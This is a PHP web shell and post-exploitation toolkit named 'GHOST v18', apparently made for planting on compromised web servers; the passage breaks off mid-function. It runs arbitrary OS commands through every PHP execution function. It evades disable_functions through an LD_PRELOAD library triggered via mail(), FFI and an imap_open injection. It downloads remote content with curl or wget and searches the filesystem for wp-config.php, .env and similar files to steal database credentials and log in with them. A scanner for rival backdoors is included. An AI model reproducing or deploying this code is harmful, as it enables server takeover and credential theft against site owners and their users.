<?php
// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
// GHOST v18 - V9: Infinite Hunter (Phase 8, 9, 10).

define('GH_VER',      '18.0.0-v9');
define('GH_TAG',      'gong');
define('GH_STATE_DIR', gh_state_dir());
define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');

@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

function gh_state_dir() {
    $c = array();
    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
    $c[] = @getcwd();
    foreach ($c as $d) {
        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
        return rtrim($d, '/\\');
    }
    return '/tmp';
}
function gh_log($msg) {
    if (!defined('GH_LOG_FILE')) return;
    $f = GH_LOG_FILE;
    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
}
function gh_json($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: application/json; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo @json_encode($data);
    exit;
}
function gh_disabled_list() {
    $s = (string)@ini_get('disable_functions');
    if ($s === '') return array();
    $out = array();
    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
    return $out;
}
function gh_can($fn) {
    $fn = @strtolower($fn);
    if (in_array($fn, gh_disabled_list(), true)) return false;
    return function_exists($fn);
}
function gh_tmpdir() {
    $t = @sys_get_temp_dir();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @ini_get('upload_tmp_dir');
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @getcwd();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    return null;
}
function gh_env() {
    $e = array(
        'gh_ver' => GH_VER, 'php_version' => @phpversion(), 'php_sapi' => @php_sapi_name(),
        'user' => gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['name'] : (string)@get_current_user(),
        'tmpdir' => gh_tmpdir(), 'state_dir' => GH_STATE_DIR,
        'disabled' => gh_disabled_list(), 'open_basedir' => (string)@ini_get('open_basedir'),
        'can' => array(
            'exec' => gh_can_exec(), 'read' => gh_can_read(), 'write' => gh_can_write(),
            'curl' => gh_can('curl_init'), 'fopen' => gh_can('fopen'),
            'pdo' => gh_can('pdo_drivers'), 'mysqli' => gh_can('mysqli_connect'),
        ),
    );
    return $e;
}
function gh_can_exec() {
    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_read() {
    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_write() {
    foreach (array('file_put_contents','fopen','fwrite') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

function gh_fetch_adv($url, $timeout = 10) {
    if (gh_can('curl_init')) {
        $c = @curl_init($url);
        if ($c) {
            @curl_setopt_array($c, array(CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => $timeout, CURLOPT_USERAGENT => 'Mozilla/5.0', CURLOPT_SSL_VERIFYPEER => false));
            $d = @curl_exec($c); $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE); @curl_close($c);
            if ($d !== false && $code >= 200 && $code < 400) return array('out' => $d, 'tier' => 'curl');
        }
    }
    if (gh_can('file_get_contents')) {
        $ctx = @stream_context_create(array('http' => array('timeout' => $timeout, 'user_agent' => 'Mozilla/5.0'), 'ssl' => array('verify_peer' => false)));
        $d = @file_get_contents($url, false, $ctx);
        if ($d !== false && $d !== '') return array('out' => $d, 'tier' => 'fopen');
    }
    if (gh_can_exec()) {
        $tmp = gh_tmpdir() . '/gh_fetch_' . rand(1000,9999) . '.tmp';
        $cmd = 'curl -s -k -L -m ' . (int)$timeout . ' ' . @escapeshellarg($url) . ' > ' . @escapeshellarg($tmp) . ' 2>/dev/null || wget -q -O ' . @escapeshellarg($tmp) . ' ' . @escapeshellarg($url);
        gh_exec($cmd, $timeout + 2);
        if (@is_file($tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if ($d) return array('out' => $d, 'tier' => 'system'); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All fetch tiers failed');
}

function gh_exec($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';
    if (gh_can('system')) { @ob_start(); @system($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null); }
    if (gh_can('passthru')) { @ob_start(); @passthru($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null); }
    if (gh_can('shell_exec')) { $out = @shell_exec($wrapped); if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null); }
    if (gh_can('exec')) { $lines = array(); @exec($wrapped, $lines); if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null); }
    if (gh_can('popen')) {
        $h = @popen($wrapped, 'r');
        if (is_resource($h)) { $out = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; } @pclose($h); return array('out' => $out, 'tier' => 'popen', 'err' => null); }
    }
    if (gh_can('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w')); $h = @proc_open($wrapped, $desc, $pipes);
        if (is_resource($h)) {
            @stream_set_blocking($pipes[1], false); @stream_set_blocking($pipes[2], false);
            $out = ''; $start = @time();
            while (true) {
                $out .= (string)@stream_get_contents($pipes[1]); $out .= (string)@stream_get_contents($pipes[2]);
                $st = @proc_get_status($h); if (!is_array($st) || !$st['running']) break;
                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
                @usleep(50000);
            }
            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($h);
            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
        }
    }
    $out = @`$wrapped`;
    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);
    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
}

function gh_exec_adv($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $r = gh_exec($cmd, $timeout); 
    if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== null) return $r;

    if (gh_can('putenv') && gh_can('mail') && gh_can('file_put_contents') && gh_can_exec()) {
        $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so'; $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
        $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n  unsetenv(\"LD_PRELOAD\");\n  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
        if (@file_put_contents($tmp_dir . '/gh_c.c', $c_code) !== false) {
            gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
            if (@is_file($so_file)) {
                @file_put_contents($cmd_file, $cmd); @putenv("LD_PRELOAD=" . $so_file); @mail('a@b.c', 'x', 'x'); @putenv("LD_PRELOAD=");
                @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
                return array('out' => '(Executed via LD_PRELOAD)', 'tier' => 'ld_preload', 'err' => null);
            }
        }
    }
    if (gh_can('ffi') && class_exists('FFI')) {
        try { $ffi = FFI::cdef("int system(const char *command);"); @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); return array('out' => $out, 'tier' => 'ffi', 'err' => null); } catch (Throwable $e) {}
    }
    if (gh_can('imap_open')) {
        $payload = "() { ;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
        if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
}

function gh_read($path, $max = 5242880) {
    if (!is_string($path) || $path === '' || !@is_file($path)) return null;
    $sz = @filesize($path); if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);
    if (gh_can('file_get_contents')) { $d = @file_get_contents($path); if (is_string($d)) return $d; }
    if (gh_can('fopen') && gh_can('fread')) { $h = @fopen($path, 'rb'); if (is_resource($h)) { $d = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; } @fclose($h); if (is_string($d)) return $d; } }
    if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
    if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
    $r = gh_exec_adv('cat ' . @escapeshellarg($path)); if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== '') return $r['out'];
    return null;
}

function gh_read_chunk($path, $chunk_size = 2097152) {
    if (!@is_file($path)) return null;
    $sz = @filesize($path);
    if ($sz === false || $sz > 20971520) return null;
    $h = @fopen($path, 'rb');
    if (!$h) return null;
    $out = ''; $read = 0;
    while (!@feof($h) && $read < 20971520) {
        $chunk = @fread($h, $chunk_size);
        if ($chunk === false) break;
        $out .= $chunk;
        $read += strlen($chunk);
    }
    @fclose($h);
    return $out;
}

function gh_write($path, $data, $append = false) {
    if (!is_string($path) || $path === '' || !is_string($data)) return false;
    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;
    if (gh_can('file_put_contents')) { $n = @file_put_contents($path, $data, $flags); if ($n !== false) return true; }
    if (gh_can('fopen') && gh_can('fwrite')) { $h = @fopen($path, $append ? 'ab' : 'wb'); if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; } }
    $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
    $r = gh_exec_adv($cmd); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

function gh_del($path) {
    if (!is_string($path) || $path === '') return false;
    if (gh_can('unlink')) { if (@unlink($path)) return true; }
    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

// ==== SECTION 3: STATIC AI ANALYZER =========================================
function gh_analyze_intent($content) {
    if (!is_string($content) || $content === '') return array('score' => 0, 'reason' => 'Empty');
    $score = 0; $reasons = array();
    if (preg_match('/\b(eval|assert|create_function)\s*\(/i', $content)) { $score += 40; $reasons[] = "Fungsi eksekusi dinamis (eval/assert)"; }
    if (preg_match('/\b(system|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(/i', $content)) { $score += 40; $reasons[] = "Eksekusi perintah OS (system/exec)"; }
    if (preg_match('/`.*?`/s', $content) && preg_match('/\$_/', $content)) { $score += 30; $reasons[] = "Eksekusi shell via backtick (`)"; }
    if (preg_match('/\$[a-zA-Z0-9_]+\s*\([^)]*\$[a-zA-Z0-9_]*\)/i', $content)) { $score += 20; $reasons[] = "Variable Function (misal: $a($b))"; }
    if (preg_match('/(base64_decode|gzinflate|gzuncompress|str_rot13|hex2bin|pack)\s*\(/i', $content)) { $score += 25; $reasons[] = "Decoding (base64/gzip/hex)"; }
    if (preg_match('/preg_replace\s*\(.*?\/e/i', $content)) { $score += 30; $reasons[] = "preg_replace e-modifier (RCE)"; }
    if (substr_count($content, '.=') > 10) { $score += 20; $reasons[] = "Penumpukan string (String Concatenation)"; }
    if (preg_match('/\b(file_get_contents|fopen|readfile|curl_exec|fsockopen)\s*\(/i', $content) && preg_match('/\$_/', $content)) { $score += 15; $reasons[] = "Input user masuk ke File/Network"; }
    if (preg_match('/\/etc\/(passwd|shadow)|wp-config\.php|\.env|\.ssh/i', $content)) { $score += 30; $reasons[] = "Target file sensitif (passwd/wp-config)"; }
    if (preg_match('/HTTP_X_AUTH/i', $content) || (preg_match('/hex2bin\(/i', $content) && preg_match('/hash_equals/i', $content))) { $score += 50; $reasons[] = "Backdoor Auth Bypass (X-Auth/Hash)"; }
    return array('score' => $score, 'reason' => implode(', ', $reasons));
}

function gh_scan_batch($root, $offset = 0, $limit = 50) {
    $res = array('files' => array(), 'done' => false, 'total' => 0);
    $all_files = array(); $stack = array($root);
    while ($stack) {
        $current = @array_pop($stack);
        $files = @scandir($current);
        if ($files === false) continue;
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $current . '/' . $f;
            if (@is_dir($path) && !@is_link($path)) { $stack[] = $path; }
            elseif (@is_file($path)) {
                if (@filesize($path) > 20 * 1024 * 1024) continue; 
                $all_files[] = $path;
            }
        }
    }
    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);
    
    $illegal_kw = array('slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol','slot88','toto','bandar','sbobet');
    $mal_users = array();

    foreach ($batch as $path) {
        $c = gh_read_chunk($path, 2097152);
        $size = @filesize($path);
        $filename = basename($path);
        $ext = @strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $findings = array(); $type = ''; $desc = '';
        
        $owner = @posix_getpwuid(@fileowner($path));
        $owner_name = is_array($owner) ? $owner['name'] : 'unknown';
        
        $intent = gh_analyze_intent($c);
        $score = $intent['score'];
        $reason = $intent['reason'];

        if (preg_match('/^\.vnt_[a-f0-9]+\.php$|^\.vnt_/i', $filename)) {
            $type = 'Leftover Dropper (Sampah)';
            $desc = 'File sisa dari exploit/backdoor yang gagal. AMAN UNTUK DIHAPUS.';
        } elseif ($score >= 60) {
            $type = 'AI: High Malicious Intent';
            $desc = "Skor $score/100. Terdeteksi: $reason";
        } elseif ($score >= 30) {
            $type = 'AI: Suspicious Code';
            $desc = "Skor $score/100. Terdeteksi: $reason";
        } elseif (is_string($c) && (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false)) { 
            $type = 'Obfuscated RCE'; $desc = 'Menggunakan eval()/assert().'; 
        } elseif (is_string($c) && preg_match('/(shell_exec|passthru|system|popen|proc_open|pcntl_exec)\s*\(\s*\$_/i', $c)) { 
            $type = 'Direct Webshell'; $desc = 'Mengeksekusi shell dari parameter HTTP.'; 
        } elseif (!$ext && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Hidden PHP'; $desc = 'File tanpa ekstensi tapi berisi kode PHP.';
        } elseif (in_array($ext, array('jpg','jpeg','png','gif')) && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Polyglot Malware'; $desc = 'Gambar disisipi kode PHP.';
        } elseif ($size > 102400 && is_string($c) && $ext === 'php') {
            $sample = substr($c, 0, 102400);
            $freq = array_count_values(str_split($sample));
            $ent = 0; $len = strlen($sample);
            foreach ($freq as $cnt) { $p = $cnt / $len; $ent -= $p * log($p, 2); }
            if ($ent > 5.5) { 
                $type = 'High Entropy (Obfuscated)';
                $desc = "File PHP besar dengan entropy tinggi ($ent). Kemungkinan malware ter-encode.";
            }
        } elseif ($size === 0 && in_array($ext, array('php','phtml'))) { 
            $type = 'Empty Shell'; $desc = 'File 0-byte. Backdoor gagal upload.';
        }
        
        $found_kw = array();
        if (is_string($c)) {
            foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
        }
        if ($found_kw) { 
            if($type === '') { $type = 'Illegal Content'; $desc = 'Konten judi/porno/ilegal.'; }
            $desc .= ' Keyword: ' . implode(', ', $found_kw); 
        }
        
        if ($type !== '') {
            $mal_users[$owner_name] = true;
            $desc .= " (Owner: $owner_name)";
            $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc, 'owner' => $owner_name);
        } else {
            $global_blacklist = @json_decode(@file_get_contents(GH_STATE_DIR . '/gh_blacklist.json'), true);
            if (is_array($global_blacklist) && isset($global_blacklist[$owner_name])) {
                $type = 'Suspicious (Attributed)';
                $desc = "File ini bersih, TAPI di-upload oleh user '$owner_name' yang sebelumnya ketahuan meng-upload backdoor.";
                $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc, 'owner' => $owner_name);
            }
        }
    }
    
    if (!empty($mal_users)) {
        $bl_file = GH_STATE_DIR . '/gh_blacklist.json';
        $bl = @json_decode(@file_get_contents($bl_file), true);
        if (!is_array($bl)) $bl = array();
        foreach ($mal_users as $u => $tr) { $bl[$u] = time(); }
        @file_put_contents($bl_file, json_encode($bl));
    }

    return $res;
}

// ==== SECTION 4: INFINITE DB HIJACKER (V9) ==================================
function gh_db_connect($host, $user, $pass) {
    $host = trim($host); $user = trim($user); $pass = trim($pass);
    
    if (gh_can('mysqli_connect')) {
        try { $conn = @mysqli_connect($host, $user, $pass); if ($conn) return $conn; } catch (Throwable $e) {}
    }
    if (gh_can('pdo_drivers') && in_array('mysql', @pdo_drivers())) {
        try { $pdo = new PDO("mysql:host=$host", $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
    }
    if (gh_can_exec()) {
        $cmd = 'mysql -h ' . @escapeshellarg($host) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
        $res = gh_exec_adv($cmd);
        if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
            return 'CLI';
        }
    }
    return false;
}

function gh_db_harvest() {
    $logs = array(); $info = array();
    $found_pass = false;
    $db_host = 'localhost'; $db_user = ''; $db_pass = '';
    $max_iterations = 3; // Looping

    for ($iter = 1; $iter <= $max_iterations; $iter++) {
        if ($found_pass) break;
        $logs[] = "=== ITERATION $iter / $max_iterations ===";

        // --- PHASE 1: FILE SCANNER ---
        $logs[] = "[*] Phase 1: Scanning config files...";
        $find_res = gh_exec_adv("find /home /var/www /etc /tmp -maxdepth 5 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' -o -name '*.sql' \\) 2>/dev/null");
        
        $found_configs = array();
        if (isset($find_res['out']) && is_string($find_res['out'])) {
            $lines = explode("\n", trim($find_res['out']));
            foreach ($lines as $l) { if (trim($l)) $found_configs[] = trim($l); }
        }

        foreach ($found_configs as $cf) {
            $c = gh_read($cf);
            if ($c) {
                $logs[] = "[+] Config ditemukan: $cf";
                if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = trim($m[1]);
                elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = trim($m[1]);
                elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = trim($m[1]);

                if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = trim($m[1]);
                elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = trim($m[1]);
                elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = trim($m[1]);

                if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = trim($m[1]);
                elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = trim($m[1]);
                elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = trim($m[1]);

                if ($db_user && $db_pass) { 
                    $logs[] = "[*] Mencoba koneksi dengan kredensial $db_user...";
                    $conn = gh_db_connect($db_host, $db_user, $db_pass);
                    if ($conn) { $logs[] = "[+] KONEKSI BERHASIL!"; $found_pass = true; break
